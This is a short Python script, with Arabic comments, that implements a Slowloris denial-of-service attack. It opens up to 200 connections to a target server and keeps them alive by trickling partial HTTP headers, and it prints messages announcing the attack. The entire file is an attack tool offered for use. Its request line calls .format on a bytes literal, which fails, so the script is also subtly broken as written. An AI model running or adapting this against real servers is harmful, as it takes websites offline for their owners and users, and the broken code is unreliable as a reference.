import socket
import time
import threading
import random

def slowloris(target_ip, target_port, duration):
    socket.setdefaulttimeout(10)
    timeout = time.time() + duration

    sockets = []

    print(f"[Slowloris] Starting attack on {target_ip}:{target_port} for {duration}s")

    # فتح اتصالات متعددة
    try:
        while time.time() < timeout:
            while len(sockets) < 200:  # عدد الاتصالات المفتوحة
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.send(b"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1000)).encode('utf-8'))
                    s.send(b"User-Agent: Mozilla/5.0\r\n")
                    s.send(b"Accept-language: en-US,en,q=0.5\r\n")
                    sockets.append(s)
                except Exception:
                    break

            for s in list(sockets):
                try:
                    s.send(b"X-a: b\r\n")  # إرسال رأس HTTP ببطء
                except Exception:
                    sockets.remove(s)

            time.sleep(15)  # انتظر 15 ثانية قبل الإرسال التالي

    except KeyboardInterrupt:
        print("[Slowloris] Attack stopped by user.")

    finally:
        for s in sockets:
            s.close()
        print("[Slowloris] Attack finished.")
